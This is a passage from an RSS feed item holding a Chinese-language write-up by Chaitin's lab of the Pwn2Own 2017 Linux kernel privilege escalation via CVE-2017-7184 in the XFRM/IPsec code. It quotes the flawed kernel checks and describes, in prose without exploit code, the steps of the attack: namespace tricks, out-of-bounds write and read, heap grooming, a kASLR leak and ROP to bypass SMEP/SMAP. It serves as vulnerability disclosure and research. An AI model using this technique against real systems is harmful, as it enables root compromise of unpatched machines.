Desktop的本地提权。本次攻击主要利用了linux内核IPSEC框架(自linux2.6开始支持)中的一个内存越界漏洞，CVE编号为CVE-2017-7184。&lt;/p&gt;&lt;p&gt;众所周知，Linux的应用范围甚广,我们经常使用的Android、Redhat、CentOS、Ubuntu、Fedora等都使用了Linux操作系统。在PWN2OWN之后，Google、Redhat也针对相应的产品发出了漏洞公告或补丁(见参考资料)。并表示了对长亭安全研究实验室的致谢，在此也建议还没有升级服务器内核的小伙伴们及时更新内核到最新版本:P&lt;/p&gt;&lt;p&gt;不同于通常的情况，为了增加比赛难度，本次PWN2OWN大赛使用的Linux版本开启了诸多漏洞缓解措施，kASLR、SMEP、SMAP都默认开启，在这种情况下，漏洞变得极难利用，很多漏洞可能仅仅在这些缓解措施面前就会败下阵来。&lt;/p&gt;&lt;p&gt;另外值得一提的是，本次利用的漏洞隐蔽性极高，在linux内核中存在的时间也非常长。因为触发这个漏洞不仅需要排布内核数据结构，而且需要使内核处理攻击者精心构造的数据包，使用传统的fuzz方式几乎是不可能发现此漏洞的。&lt;/p&gt;&lt;br&gt;&lt;p&gt;最终，长亭安全研究实验室成功利用这个漏洞在PWN2OWN的赛场上弹出了PWN2OWN历史上的第一个xcalc, ZDI的工作人员们看到了之后也表示惊喜不已。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-501fff7430c7f2ec24267dd1c66adea8_r.png&quot; data-rawwidth=&quot;593&quot; data-rawheight=&quot;200&quot;&gt;&lt;p&gt;下面一起来看一下整个漏洞的发现和利用过程。&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;1.IPSEC协议简介&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;IPSEC是一个协议组合，它包含AH、ESP、IKE协议，提供对数据包的认证和加密功能。&lt;/p&gt;&lt;p&gt;为了帮助更好的理解漏洞成因，下面有几个概念需要简单介绍一下&lt;/p&gt;&lt;p&gt;&lt;b&gt;(1) SA(Security Associstion)&lt;/b&gt;&lt;/p&gt;&lt;p&gt;SA由spi、ip、安全协议标识(AH或ESP)这三个参数唯一确定。SA定义了ipsec双方的ip地址、ipsec协议、加密算法、密钥、模式、抗重放窗口等。&lt;/p&gt;&lt;p&gt;&lt;b&gt;(2) AH(Authentication Header)&lt;/b&gt;&lt;/p&gt;&lt;p&gt;AH为ip包提供数据完整性校验和身份认证功能，提供抗重放能力，验证算法由SA指定。&lt;/p&gt;&lt;p&gt;&lt;b&gt;(3) ESP(Encapsulating security payload)&lt;/b&gt;&lt;/p&gt;&lt;p&gt;ESP为ip数据包提供完整性检查、认证和加密。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;2.Linux内核的IPSEC实现&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在linux内核中的IPSEC实现即是xfrm这个框架，关于xfrm的代码主要在net/xfrm以及net/ipv4下。&lt;/p&gt;&lt;p&gt;以下是/net/xfrm下的代码的大概功能&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;xfrm_state.c     状态管理
xfrm_policy.c    xfrm策略管理
xfrm_algo.c      算法管理
xfrm_hash.c      哈希计算函数
xfrm_input.c     安全路径(sec_path)处理， 用于处理进入的ipsec包
xfrm_user.c      netlink接口的SA和SP(安全策略)管理
&lt;/code&gt;&lt;br&gt;&lt;p&gt;其中xfrm_user.c中的代码允许我们向内核发送netlink消息来调用相关handler实现对SA和SP的配置，其中涉及处理函数如下。&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;xfrm_dispatch[XFRM_NR_MSGTYPES] = {
[XFRM_MSG_NEWSA       - XFRM_MSG_BASE] = { .doit = xfrm_add_sa        },
[XFRM_MSG_DELSA       - XFRM_MSG_BASE] = { .doit = xfrm_del_sa        },
[XFRM_MSG_GETSA       - XFRM_MSG_BASE] = { .doit = xfrm_get_sa,
	.dump = xfrm_dump_sa,
	.done = xfrm_dump_sa_done  },
[XFRM_MSG_NEWPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_add_policy    },
[XFRM_MSG_DELPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy    },
[XFRM_MSG_GETPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy,
	                                   .dump = xfrm_dump_policy,
	                                   .done = xfrm_dump_policy_done },
[XFRM_MSG_ALLOCSPI    - XFRM_MSG_BASE] = { .doit = xfrm_alloc_userspi },
[XFRM_MSG_ACQUIRE     - XFRM_MSG_BASE] = { .doit = xfrm_add_acquire   },
[XFRM_MSG_EXPIRE      - XFRM_MSG_BASE] = { .doit = xfrm_add_sa_expire },
[XFRM_MSG_UPDPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_add_policy    },
[XFRM_MSG_UPDSA       - XFRM_MSG_BASE] = { .doit = xfrm_add_sa        },
[XFRM_MSG_POLEXPIRE   - XFRM_MSG_BASE] = { .doit = xfrm_add_pol_expire},
[XFRM_MSG_FLUSHSA     - XFRM_MSG_BASE] = { .doit = xfrm_flush_sa      },
[XFRM_MSG_FLUSHPOLICY - XFRM_MSG_BASE] = { .doit = xfrm_flush_policy  },
[XFRM_MSG_NEWAE       - XFRM_MSG_BASE] = { .doit = xfrm_new_ae  },
[XFRM_MSG_GETAE       - XFRM_MSG_BASE] = { .doit = xfrm_get_ae  },
[XFRM_MSG_MIGRATE     - XFRM_MSG_BASE] = { .doit = xfrm_do_migrate    },
[XFRM_MSG_GETSADINFO  - XFRM_MSG_BASE] = { .doit = xfrm_get_sadinfo   },
[XFRM_MSG_NEWSPDINFO  - XFRM_MSG_BASE] = { .doit = xfrm_set_spdinfo,
		                           .nla_pol = xfrma_spd_policy,
				           .nla_max = XFRMA_SPD_MAX },
[XFRM_MSG_GETSPDINFO  - XFRM_MSG_BASE] = { .doit = xfrm_get_spdinfo   },
};&lt;/code&gt;&lt;p&gt;下面简单介绍一下其中几个函数的功能:&lt;/p&gt;&lt;p&gt;&lt;b&gt;xfrm_add_sa&lt;/b&gt;&lt;/p&gt;&lt;p&gt;创建一个新的SA，并可以指定相关attr，在内核中，是用一个xfrm_state结构来表示一个SA的。&lt;/p&gt;&lt;p&gt;&lt;b&gt;xfrm_del_sa&lt;/b&gt;&lt;/p&gt;&lt;p&gt;删除一个SA，也即删除一个指定的xfrm_state。&lt;/p&gt;&lt;p&gt;&lt;b&gt;xfrm_new_ae&lt;/b&gt;&lt;/p&gt;&lt;p&gt;根据传入参数，更新指定xfrm_state结构中的内容。&lt;/p&gt;&lt;p&gt;&lt;b&gt;xfrm_get_ae&lt;/b&gt;&lt;/p&gt;&lt;p&gt;根据传入参数，查询指定xfrm_state结构中的内容(包括attr)。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;3.漏洞成因&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当我们发送一个XFRM_MSG_NEWSA类型的消息时，即可调用xfrm_add_sa函数来创建一个新的SA，一个新的xfrm_state也会被创建。在内核中，其实SA就是使用xfrm_state这个结构来表示的。&lt;/p&gt;&lt;br&gt;&lt;p&gt;若在netlink消息里面使用XFRMA_REPLAY_ESN_VAL这个attr，一个replay_state_esn结构也会被创建。它的结构如下所示，可以看到它包含了一个bitmap，这个bitmap的长度是由bmp_len这个成员变量动态标识的。&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;struct xfrm_replay_state_esn {
    unsigned int bmp_len;
    __u32   oseq;
    __u32   seq;
    __u32   oseq_hi;
    __u32   seq_hi;
    __u32   replay_window;
    __u32   bmp[0];
};
&lt;/code&gt;&lt;p&gt;内核对这个结构的检查主要有以下几种情况:&lt;/p&gt;&lt;p&gt;首先，xfrm_add_sa函数在调用verify_newsa_info检查从用户态传入的数据时，会调用verify_replay来检查传入的replay_state_esn结构。&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;static inline int verify_replay(struct xfrm_usersa_info *p,
				struct nlattr **attrs)
{
	struct nlattr *rt = attrs[XFRMA_REPLAY_ESN_VAL];
	struct xfrm_replay_state_esn *rs;

	if (p-&amp;gt;flags &amp;amp; XFRM_STATE_ESN) {
		if (!rt)
			return -EINVAL;

		rs = nla_data(rt);

		if (rs-&amp;gt;bmp_len &amp;gt; XFRMA_REPLAY_ESN_MAX / sizeof(rs-&amp;gt;bmp[0]) / 8)
			return -EINVAL;

		if (nla_len(rt) &amp;lt; xfrm_replay_state_esn_len(rs) &amp;amp;&amp;amp;
		    nla_len(rt) != sizeof(*rs))
			return -EINVAL;
	}

	if (!rt)
		return 0;

	/* As only ESP and AH support ESN feature. */
	if ((p-&amp;gt;id.proto != IPPROTO_ESP) &amp;amp;&amp;amp; (p-&amp;gt;id.proto != IPPROTO_AH))
		return -EINVAL;

	if (p-&amp;gt;replay_window != 0)
		return -EINVAL;

	return 0;
}
&lt;/code&gt;&lt;p&gt;这个函数要求replay_state_esn结构的bmp_len不可以超过最大限制XFRMA_REPLAY_ESN_MAX。&lt;/p&gt;&lt;br&gt;&lt;p&gt;另外，在这个创建xfrm_state的过程中，如果检查到成员中有xfrm_replay_state_esn结构，如下函数中的检查便会被执行。&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;int xfrm_init_replay(struct xfrm_state *x)
{
	struct xfrm_replay_state_esn *replay_esn = x-&amp;gt;replay_esn;

	if (replay_esn) {
		if (replay_esn-&amp;gt;replay_window &amp;gt;
		    replay_esn-&amp;gt;bmp_len * sizeof(__u32) * 8) &amp;lt;-----检查replay_window
			return -EINVAL;

		if (x-&amp;gt;props.flags &amp;amp; XFRM_STATE_ESN) {
			if (replay_esn-&amp;gt;replay_window == 0)
				return -EINVAL;
			x-&amp;gt;repl = &amp;amp;xfrm_replay_esn;
		} else
			x-&amp;gt;repl = &amp;amp;xfrm_replay_bmp;
	} else
		x-&amp;gt;repl = &amp;amp;xfrm_replay_legacy;

	return 0;
}
&lt;/code&gt;&lt;p&gt;这个函数确保了replay_window不会比bitmap的长度大，否则函数会直接退出。&lt;/p&gt;&lt;br&gt;&lt;p&gt;下面再来看一下xfrm_new_ae这个函数,它首先会解析用户态传入的几个attr，然后根据spi的哈希值以及ip找到指定的xfrm_state，之后xfrm_replay_verify_len中会对传入的replay_state_esn结构做一个检查，通过后即会调用xfrm_update_ae_params函数来更新对应的xfrm_state结构。下面我们来看一下xfrm_replay_verify_len这个函数。&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;static inline int xfrm_replay_verify_len(struct xfrm_replay_state_esn *replay_esn,
					 struct nlattr *rp)
{
	struct xfrm_replay_state_esn *up;
	int ulen;

	if (!replay_esn || !rp)
		return 0;

	up = nla_data(rp);
	ulen = xfrm_replay_state_esn_len(up);

	if (nla_len(rp) &amp;lt; ulen || xfrm_replay_state_esn_len(replay_esn) != ulen)
		return -EINVAL;

	return 0;
}
&lt;/code&gt;&lt;p&gt;我们可以看到这个函数没有对replay_window做任何的检查，只需要提供的bmp_len与xfrm_state中原来的bmp_len一致就可以通过检查。所以此时我们可以控制replay_window超过bmp_len。之后内核在处理相关IPSEC数据包进行重放检测相关的操作时，对这个bitmap结构的读写操作都可能会越界。&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;4.漏洞利用&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;(1).权限不满足&lt;/b&gt;&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;	/* All operations require privileges, even GET */
	if (!netlink_net_capable(skb, CAP_NET_ADMIN))
		return -EPERM;
&lt;/code&gt;&lt;p&gt;在&lt;b&gt;xfrm_user_rcv_msg&lt;/b&gt;函数中，我们可以看到，对于相关的操作，其实都是需要CAP_NET_ADMIN权限的。那是不是我们就无法触发这个漏洞了呢？&lt;/p&gt;&lt;p&gt;答案是否定的，在这里我们可以利用好linux的命名空间机制，在ubuntu，Fedora等发行版，User namespace是默认开启的。非特权用户可以创建用户命名空间、网络命名空间。在命名空间内部，我们就可以有相应的capability来触发漏洞了。&lt;/p&gt;&lt;p&gt;&lt;b&gt;(2).越界写&lt;/b&gt;&lt;/p&gt;&lt;p&gt;当内核在收到ipsec的数据包时，最终会在xfrm_input解包并进行相关的一些操作。在xfrm_input中，找到对应的xfrm_state之后，根据数据包内容进行重放检测的时候会执行x-&amp;gt;repl-&amp;gt;advance(x, seq);，即xfrm_replay_advance_esn这个函数。&lt;br&gt;这个函数会对bitmap进行如下操作&lt;/p&gt;&lt;p&gt;1.清除[last seq, current seq)的bit&lt;br&gt;2.设置bmp[current seq] = 1&lt;/p&gt;&lt;br&gt;&lt;p&gt;我们可以指定好spi、seq等参数(内核是根据spi的哈希值以及ip地址来确定SA的)，并让内核来处理我们发出的ESP数据包，多次进行这个操作即可达到对越界任意长度进行写入任意值。&lt;/p&gt;&lt;p&gt;&lt;b&gt;(3).越界读&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我们的思路是使用越界写，改大下一个replay_state_esn的结构中的bmp_len。之后我们就可以利用下一个bitmap结构进行越界读。所以我们需要两个相邻的replay_state结构。我们可以使用defragment技巧来达到这个效果。即首先分配足够多的同样大小的replay_state结构把堆上原来的坑填满，之后便可大概率保证连续分配的replay_state结构是相邻的。&lt;/p&gt;&lt;p&gt;如上所述，使用越界写的能力将下一个bitmap长度改大，即可使用这个bitmap结构做越界读了。&lt;/p&gt;&lt;br&gt;&lt;p&gt;图中所示为被改掉bmp_len的bitmap结构。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cbbdaf449949bbe2dfb8f4c35d594f86_r.png&quot; data-rawwidth=&quot;994&quot; data-rawheight=&quot;352&quot;&gt;&lt;p&gt;&lt;b&gt;(4).绕过kASLR&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我们通过xfrm_del_sa接口把没用的xfrm_state都给删掉。这样就可以在堆上留下很多的坑。之后我们可以向内核喷射很多struct file结构体填在这些坑里。&lt;/p&gt;&lt;br&gt;&lt;p&gt;如下，利用上面已经构造出的越界读能力，我们可以泄露一些内核里的指针来算出内核的加载地址和bitmap的位置。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-03a554f1cb085f935864d6dfc92cfcc4_r.png&quot; data-rawwidth=&quot;876&quot; data-rawheight=&quot;582&quot;&gt;&lt;br&gt;&lt;h3&gt;&lt;b&gt;5.内核任意地址读写及代码执行&lt;/b&gt;&lt;/h3&gt;&lt;p&gt;因为已经绕过了内核地址随机化,这时我们可以进行内核ROP构造了。&lt;/p&gt;&lt;p&gt;1.在这个漏洞的利用当中，我们可以在bitmap中伪造一个file_operations结构。&lt;/p&gt;&lt;br&gt;&lt;p&gt;2.之后通过越界写可以改写掉我们刚刚在内核中喷射的struct file结构体的file_operations指针，使其指向合适的ROPgadget。&lt;/p&gt;&lt;p&gt;3.调用llseek函数(实际上已经是rop gadget)来执行我们事先已经准备好的ROP链。&lt;/p&gt;&lt;p&gt;4.通过多次改写file_operations结构中的llseek函数指针来实现多次执行ROPgadget实现提权。&lt;/p&gt;&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-85c692073833115861cb228708db24ce_r.png&quot; data-rawwidth=&quot;926&quot; data-rawheight=&quot;375&quot;&gt;&lt;br&gt;&lt;p&gt;如上所述，因为我们的数据都是伪造在内核里面，所以这种利用方式其实是可以同时绕过SMEP和SMAP的。&lt;/p&gt;&lt;h3&gt;&lt;b&gt;6.权限提升&lt;/b&gt;&lt;/h3&gt;&lt;p&gt;下面是长亭安全研究实验室在pwn2own2017上弹出xcalc的瞬间。&lt;/p&gt;&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-dc7307c80c802c866f0e8d7c42cf5ca8_r.png&quot; data-rawwidth=&quot;2104&quot; data-rawheight=&quot;1466&quot;&gt;&lt;h2&gt;&lt;b&gt;5.后记&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;非常感谢slipper老师的指导和讲解 :P&lt;/p&gt;&lt;p&gt;感谢长亭安全研究实验室的所有小伙伴:P&lt;/p&gt;&lt;h2&gt;&lt;b&gt;6.参考资料&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;IPSEC协议: &lt;a href=&quot;https://en.wikipedia.org/wiki/IPsec&quot; data-editable=&quot;true&quot; data-title=&quot;IPsec - Wikipedia&quot; class=&quot;&quot;&gt;IPsec - Wikipedia&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;linux命名空间机制: &lt;a href=&quot;https://lwn.net/Articles/531114/&quot; data-editable=&quot;true&quot; data-title=&quot;Namespaces in operation, part 1: namespaces overview&quot; class=&quot;&quot;&gt;Namespaces in operation, part 1: namespaces overview&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;CVE-2017-7184: &lt;a href=&quot;http://www.openwall.com/lists/oss-security/2017/03/29/2&quot; data-editable=&quot;true&quot; data-title=&quot;CVE-2017-7184: kernel: Local privilege escalation in XFRM framework&quot; class=&quot;&quot;&gt;CVE-2017-7184: kernel: Local privilege escalation in XFRM framework&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;@thezdi: &lt;a href=&quot;https://twitter.com/thezdi/status/842132539330375684&quot; class=&quot;&quot;&gt;https://twitter.com/thezdi/status/842132539330375684&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Android漏洞公告:&lt;a href=&quot;https://source.android.com/security/bulletin/2017-05-01&quot;&gt;https://source.android.com/security/bulletin/2017-05-01&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Redhat:&lt;a href=&quot;https://access.redhat.com/security/cve/cve-2017-7184&quot; data-editable=&quot;true&quot; data-title=&quot;Red Hat Customer Portal&quot;&gt;Red Hat Customer Portal&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;</description>
<author>赵汉青</author>
<guid isPermaLink="false">2017-05-02-26674557</guid>
<pubDate>Tue, 02 May 2017 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
